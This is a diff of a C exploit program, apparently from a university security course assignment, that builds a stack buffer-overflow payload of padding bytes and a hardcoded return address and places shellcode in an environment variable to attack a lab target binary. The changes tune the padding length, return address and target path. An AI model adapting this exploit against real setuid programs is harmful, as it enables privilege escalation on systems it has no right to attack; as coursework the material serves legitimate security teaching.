@@ -5,18 +5,18 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/srv/target1"
+#define TARGET "/home/jh2422/h4/cs5435-hw4/targets/target1"
 
 int main(void) {
     char *args[3];
     char *env[2];
 
-    char padding[12];
-    memset(padding, 'A', 12);
+    char padding[4];
+    memset(padding, 'A', 4);
 
-    char *malicious_buffer = (char *)malloc(12 + 4);
-    memcpy(malicious_buffer, padding, 12);
-    *(unsigned int *)(malicious_buffer + 12) = 0xffffd721;
+    char *malicious_buffer = (char *)malloc(4 + 4);
+    memcpy(malicious_buffer, padding, 4);
+    *(unsigned int *)(malicious_buffer + 4) = 0xffffd719;
 
     char shellcode_env[sizeof(shellcode) + 8];
     sprintf(shellcode_env, "SHELL=%s", shellcode);
